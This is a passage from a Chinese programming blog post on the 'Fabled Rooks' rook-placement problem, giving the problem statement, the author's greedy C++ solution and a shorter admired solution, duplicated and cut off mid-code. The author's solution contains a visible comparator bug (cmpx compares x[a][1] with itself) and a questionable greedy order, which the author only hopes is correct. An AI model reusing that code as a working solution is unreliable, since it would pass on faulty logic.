yli<br>, xri<br>, and<br>yri<br>. The input file is terminated with the integer ‘0’ on a line by itself.<br>Output<br>Your task is to find such a placing of rooks that the above conditions are satisfied and then output n<br>lines each giving the position of a rook in order in which their rectangles appeared in the input. If there<br>are multiple solutions, any one will do. Output ‘IMPOSSIBLE’ if there is no such placing of the rooks.<br>Sample Input<br>8<br>1 1 2 2<br>5 7 8 8<br>2 2 5 5<br>2 2 5 5<br>6 3 8 6<br>6 3 8 5<br>6 3 8 8<br>3 6 7 8<br>8<br>1 1 2 2<br>5 7 8 8<br>2 2 5 5<br>2 2 5 5<br>6 3 8 6<br>6 3 8 5<br>6 3 8 8<br>3 6 7 8<br>0<br>Sample Output<br>1 1<br>5 8<br>2 4<br>4 2<br>7 3<br>8 5<br>6 6<br>3 7<br>1 1<br>5 8<br>2 4<br>4 2<br>7 3<br>8 5<br>6 6<br>3 7</p>\n</blockquote>\n<p>简单的贪心。我的方法是给x坐标的左边排序，如果起始相同，那么按区间长度从小到大排序。然后一个一个选就好了。<br>算然我的输出不同，但答案应该不止一个，我的代码逻辑上应该是对的吧。。<br>不过长的真难看。。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight prolog\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div></pre></td><td class=\"code\"><pre><div class=\"line\">#include&lt;cstdio&gt;</div><div class=\"line\">#include&lt;iostream&gt;</div><div class=\"line\">#include&lt;string&gt;</div><div class=\"line\">#include&lt;algorithm&gt;</div><div class=\"line\"></div><div class=\"line\">using namespace std;</div><div class=\"line\">typedef long long <span class=\"symbol\">LL</span>;</div><div class=\"line\"></div><div class=\"line\">const int maxN = <span class=\"number\">5000</span>;</div><div class=\"line\"></div><div class=\"line\">int n;</div><div class=\"line\">int flag;</div><div class=\"line\">int r[maxN][<span class=\"number\">4</span>];</div><div class=\"line\">int ordx[maxN];</div><div class=\"line\">int ordy[maxN];</div><div class=\"line\">int x[maxN][<span class=\"number\">2</span>];</div><div class=\"line\">int y[maxN][<span class=\"number\">2</span>];</div><div class=\"line\">int vis[maxN];</div><div class=\"line\">int ans[maxN][<span class=\"number\">2</span>];</div><div class=\"line\"></div><div class=\"line\">bool cmpy(int a, int b)</div><div class=\"line\">&#123;</div><div class=\"line\">\tif (y[a][<span class=\"number\">0</span>] &lt; y[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\treturn true;</div><div class=\"line\">\telse if (y[a][<span class=\"number\">0</span>] == y[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\tif (y[a][<span class=\"number\">1</span>] &lt; y[b][<span class=\"number\">1</span>])</div><div class=\"line\">\t\t\treturn true;</div><div class=\"line\">\treturn false;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">bool cmpx(int a, int b)</div><div class=\"line\">&#123;</div><div class=\"line\">\tif (x[a][<span class=\"number\">0</span>] &lt; x[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\treturn true;</div><div class=\"line\">\telse if (x[a][<span class=\"number\">0</span>] == x[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\tif (x[a][<span class=\"number\">1</span>] &lt; x[a][<span class=\"number\">1</span>])</div><div class=\"line\">\t\t\treturn true;</div><div class=\"line\">\treturn false;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tscanf(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\twhile (n)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tflag = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t\tordx[i] = ordy[i] = i;</div><div class=\"line\">\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x[i][<span class=\"number\">0</span>]);</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;y[i][<span class=\"number\">0</span>]);</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x[i][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;y[i][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tsort(ordy, ordy + n, cmpy);</div><div class=\"line\">\t\tsort(ordx, ordx + n, cmpx);</div><div class=\"line\">\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\twhile (x[ordx[i]][<span class=\"number\">1</span>] - x[ordx[i]][<span class=\"number\">0</span>] &gt;= <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tif (!vis[x[ordx[i]][<span class=\"number\">0</span>]])</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tans[ordx[i]][<span class=\"number\">0</span>] = x[ordx[i]][<span class=\"number\">0</span>];</div><div class=\"line\">\t\t\t\t\tvis[x[ordx[i]][<span class=\"number\">0</span>]] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\tbreak;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\telse</div><div class=\"line\">\t\t\t\t\tx[ordx[i]][<span class=\"number\">0</span>]++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tif ((x[ordx[i]][<span class=\"number\">1</span>] - x[ordx[i]][<span class=\"number\">0</span>] &lt; <span class=\"number\">0</span>) &amp;&amp; (i != n - <span class=\"number\">1</span>))</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\tbreak;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tif (!flag)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tfor (int i = <span class=\"number\">0</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t\t\tvis[i] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\twhile (y[ordy[i]][<span class=\"number\">1</span>] - y[ordy[i]][<span class=\"number\">0</span>] &gt;= <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tif (!vis[y[ordy[i]][<span class=\"number\">0</span>]])</div><div class=\"line\">\t\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\t\tans[ordy[i]][<span class=\"number\">1</span>] = y[ordy[i]][<span class=\"number\">0</span>];</div><div class=\"line\">\t\t\t\t\t\tvis[y[ordy[i]][<span class=\"number\">0</span>]] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\t\tbreak;</div><div class=\"line\">\t\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\t\telse</div><div class=\"line\">\t\t\t\t\t\ty[ordy[i]][<span class=\"number\">0</span>]++;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\tif ((y[ordy[i]][<span class=\"number\">1</span>] - y[ordy[i]][<span class=\"number\">0</span>] &lt; <span class=\"number\">0</span>) &amp;&amp; (i != n - <span class=\"number\">1</span>))</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\tbreak;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tif (!flag)</div><div class=\"line\">\t\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t\t\tprintf(<span class=\"string\">\"%d %d\\n\"</span>, ans[i][<span class=\"number\">0</span>], ans[i][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\telse</div><div class=\"line\">\t\t\tprintf(<span class=\"string\">\"IMPOSSIBLE\"</span>);</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\treturn <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>然而比大神的代码是如此简洁</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;  </div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> N = <span class=\"number\">5005</span>;  </div><div class=\"line\"><span class=\"keyword\">int</span> xl[N], yl[N], xr[N], yr[N], x[N], y[N], n;  </div><div class=\"line\">  </div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">solve</span><span class=\"params\">(<span class=\"keyword\">int</span> a[], <span class=\"keyword\">int</span> l[], <span class=\"keyword\">int</span> r[])</span>  </span></div><div class=\"line\">&#123;  </div><div class=\"line\">    <span class=\"keyword\">int</span> cur, mr;  </div><div class=\"line\">    <span class=\"comment\">//mr为包含k的区间最小右界，cur为放k的最优区间  </span></div><div class=\"line\">    <span class=\"built_in\">memset</span>(a, <span class=\"number\">-1</span>, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)*n);  </div><div class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> k = <span class=\"number\">1</span>; k &lt;= n; ++k)  </div><div class=\"line\">    &#123;  </div><div class=\"line\">        cur = <span class=\"number\">-1</span>, mr = N;  </div><div class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; ++i)  </div><div class=\"line\">            <span class=\"keyword\">if</span>(a[i] &lt; <span class=\"number\">0</span> &amp;&amp; l[i] &lt;= k &amp;&amp; r[i] &lt; mr)  </div><div class=\"line\">                mr = r[cur = i];  </div><div class=\"line\">        <span class=\"keyword\">if</span>(cur &lt; <span class=\"number\">0</span> || k &gt; mr)  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  </div><div class=\"line\">        a[cur] = k;  </div><div class=\"line\">    &#125;  </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;  </div><div class=\"line\">&#125;  </div><div class=\"line\">  </div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span>  </span></div><div class=\"line\">&#123;  </div><div class=\"line\">    <span class=\"keyword\">while</span>(~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n), n)  </div><div class=\"line\">    &#123;  </div><div class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; ++i)  </div><div class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;xl[i], &amp;yl[i], &amp;xr[i], &amp;yr[i]);  </div><div class=\"line\">  </div><div class=\"line\">        <span class=\"keyword\">if</span>(solve(x, xl, xr) &amp;&amp; solve(y, yl, yr))  </div><div class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; ++i)  </div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %d\\n\"</span>, x[i], y[i]);  </div><div class=\"line\">        <span class=\"keyword\">else</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"IMPOSSIBLE\"</span>);  </div><div class=\"line\">    &#125;  </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  </div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>We would like to place n rooks, 1 ≤ n ≤ 5000, on a n × n<br>board subject to the following restrictions<br>• The i-th rook can only be placed within the rectangle<br>given by its left-upper corner (xli<br>, yli) and its rightlower<br>corner (xri<br>, yri), where 1 ≤ i ≤ n, 1 ≤ xli ≤<br>xri ≤ n, 1 ≤ yli ≤ yri ≤ n.<br>• No two rooks can attack each other, that is no two rooks<br>can occupy the same column or the same row.<br>Input<br>The input consists of several test cases. The first line of each<br>of them contains one integer number, n, the side of the board. n lines follow giving the rectangles<br>where the rooks can be placed as described above. The i-th line among them gives xli<br>, yli<br>, xri<br>, and<br>yri<br>. The input file is terminated with the integer ‘0’ on a line by itself.<br>Output<br>Your task is to find such a placing of rooks that the above conditions are satisfied and then output n<br>lines each giving the position of a rook in order in which their rectangles appeared in the input. If there<br>are multiple solutions, any one will do. Output ‘IMPOSSIBLE’ if there is no such placing of the rooks.<br>Sample Input<br>8<br>1 1 2 2<br>5 7 8 8<br>2 2 5 5<br>2 2 5 5<br>6 3 8 6<br>6 3 8 5<br>6 3 8 8<br>3 6 7 8<br>8<br>1 1 2 2<br>5 7 8 8<br>2 2 5 5<br>2 2 5 5<br>6 3 8 6<br>6 3 8 5<br>6 3 8 8<br>3 6 7 8<br>0<br>Sample Output<br>1 1<br>5 8<br>2 4<br>4 2<br>7 3<br>8 5<br>6 6<br>3 7<br>1 1<br>5 8<br>2 4<br>4 2<br>7 3<br>8 5<br>6 6<br>3 7</p>\n</blockquote>\n<p>简单的贪心。我的方法是给x坐标的左边排序，如果起始相同，那么按区间长度从小到大排序。然后一个一个选就好了。<br>算然我的输出不同，但答案应该不止一个，我的代码逻辑上应该是对的吧。。<br>不过长的真难看。。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight prolog\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div></pre></td><td class=\"code\"><pre><div class=\"line\">#include&lt;cstdio&gt;</div><div class=\"line\">#include&lt;iostream&gt;</div><div class=\"line\">#include&lt;string&gt;</div><div class=\"line\">#include&lt;algorithm&gt;</div><div class=\"line\"></div><div class=\"line\">using namespace std;</div><div class=\"line\">typedef long long <span class=\"symbol\">LL</span>;</div><div class=\"line\"></div><div class=\"line\">const int maxN = <span class=\"number\">5000</span>;</div><div class=\"line\"></div><div class=\"line\">int n;</div><div class=\"line\">int flag;</div><div class=\"line\">int r[maxN][<span class=\"number\">4</span>];</div><div class=\"line\">int ordx[maxN];</div><div class=\"line\">int ordy[maxN];</div><div class=\"line\">int x[maxN][<span class=\"number\">2</span>];</div><div class=\"line\">int y[maxN][<span class=\"number\">2</span>];</div><div class=\"line\">int vis[maxN];</div><div class=\"line\">int ans[maxN][<span class=\"number\">2</span>];</div><div class=\"line\"></div><div class=\"line\">bool cmpy(int a, int b)</div><div class=\"line\">&#123;</div><div class=\"line\">\tif (y[a][<span class=\"number\">0</span>] &lt; y[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\treturn true;</div><div class=\"line\">\telse if (y[a][<span class=\"number\">0</span>] == y[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\tif (y[a][<span class=\"number\">1</span>] &lt; y[b][<span class=\"number\">1</span>])</div><div class=\"line\">\t\t\treturn true;</div><div class=\"line\">\treturn false;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">bool cmpx(int a, int b)</div><div class=\"line\">&#123;</div><div class=\"line\">\tif (x[a][<span class=\"number\">0</span>] &lt; x[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\treturn true;</div><div class=\"line\">\telse if (x[a][<span class=\"number\">0</span>] == x[b][<span class=\"number\">0</span>])</div><div class=\"line\">\t\tif (x[a][<span class=\"number\">1</span>] &lt; x[a][<span class=\"number\">1</span>])</div><div class=\"line\">\t\t\treturn true;</div><div class=\"line\">\treturn false;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tscanf(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\twhile (n)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tflag = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t\tordx[i] = ordy[i] = i;</div><div class=\"line\">\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x[i][<span class=\"number\">0</span>]);</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;y[i][<span class=\"number\">0</span>]);</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x[i][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;y[i][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tsort(ordy, ordy + n, cmpy);</div><div class=\"line\">\t\tsort(ordx, ordx + n, cmpx);</div><div class=\"line\">\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\twhile (x[ordx[i]][<span class=\"number\">1</span>] - x[ordx[i]][<span class=\"number\">0</span>] &gt;= <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tif (!vis[x[ordx[i]][<span class=\"number\">0</span>]])</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tans[ordx[i]][<span class=\"number\">0</span>] = x[ordx[i]][<span class=\"number\">0</span>];</div><div class=\"line\">\t\t\t\t\tvis[x[ordx[i]][<span class=\"number\">0</span>]] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\tbreak;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\telse</div><div class=\"line\">\t\t\t\t\tx[ordx[i]][<span class=\"number\">0</span>]++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tif ((x[ordx[i]][<span class=\"number\">1</span>] - x[ordx[i]][<span class=\"number\">0</span>] &lt; <span class=\"number\">0</span>) &amp;&amp; (i != n - <span class=\"number\">1</span>))</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\tbreak;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tif (!flag)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tfor (int i = <span class=\"number\">0</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t\t\tvis[i] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\twhile (y[ordy[i]][<span class=\"number\">1</span>] - y[ordy[i]][<span class=\"number\">0</span>] &gt;= <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tif (!vis[y[ordy[i]][<span class=\"number\">0</span>]])</div><div class=\"line\">\t\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\t\tans[ordy[i]][<span class=\"number\">1</span>] = y[ordy[i]][<span class=\"number\">0</span>];</div><div class=\"line\">\t\t\t\t\t\tvis[y[ordy[i]][<span class=\"number\">0</span>]] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\t\tbreak;</div><div class=\"line\">\t\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\t\telse</div><div class=\"line\">\t\t\t\t\t\ty[ordy[i]][<span class=\"number\">0</span>]++;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\tif ((y[ordy[i]][<span class=\"number\">1</span>] - y[ordy[i]][<span class=\"number\">0</span>] &lt; <span class=\"number\">0</span>) &amp;&amp; (i != n - <span class=\"number\">1</span>))</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\tbreak;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tif (!flag)</div><div class=\"line\">\t\t\tfor (int i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t\t\tprintf(<span class=\"string\">\"%d %d\\n\"</span>, ans[i][<span class=\"number\">0</span>], ans[i][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\telse</div><div class=\"line\">\t\t\tprintf(<span class=\"string\">\"IMPOSSIBLE\"</span>);</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\treturn <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>然而比大神的代码是如此简洁</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;  </div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> N = <span class=\"number\">5005</span>;  </div><div class=\"line\"><span class=\"keyword\">int</span> xl[N], yl[N], xr[N], yr[N], x[N], y[N], n;  </div><div class=\"line\">  </div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">solve</span><span class=\"params\">(<span class=\"keyword\">int</span> a[], <span class=\"keyword\">int</span> l[], <span class=\"keyword\">int</span> r[])</span>  </span></div><div class=\"line\">&#123;  </div><div class=\"line\">    <span class=\"keyword\">int</span> cur, mr;  </div><div class=\"line\">    <span class=\"comment\">//mr为包含k的区间最小右界，cur为放k的最优区间  </span></div><div class=\"line\">    <span class=\"built_in\">memset</span>(a, <span class=\"number\">-1</span>, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)*n);  </div><div class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> k = <span class=\"number\">1</span>; k &lt;= 